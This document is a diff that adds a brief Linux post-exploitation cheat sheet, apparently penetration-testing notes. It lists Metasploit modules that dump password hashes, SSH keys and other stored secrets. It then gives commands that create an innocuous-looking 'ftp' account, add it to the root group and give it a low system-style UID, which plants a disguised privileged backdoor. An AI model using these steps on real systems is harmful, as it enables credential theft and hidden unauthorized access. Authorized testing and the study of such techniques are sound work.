@@ -1,0 +1,15 @@
+# Credentials dumping
+    # metasploit module
+    post/linux/gather/hashdump
+    auxiliary/analyze/crack_linux
+    post/multi/gather/ssh_creds
+    post/linux/gather/ecryptfs_creds
+    post/linux/gather/enum_psk
+    post/linux/gather/pptpd_chap_secrets
+
+# Add user
+    useradd -m ftp -s /bin/bash
+    passwd ftp
+    usermod -aG root ftp
+    usermod -u 15 ftp
+    groups ftp
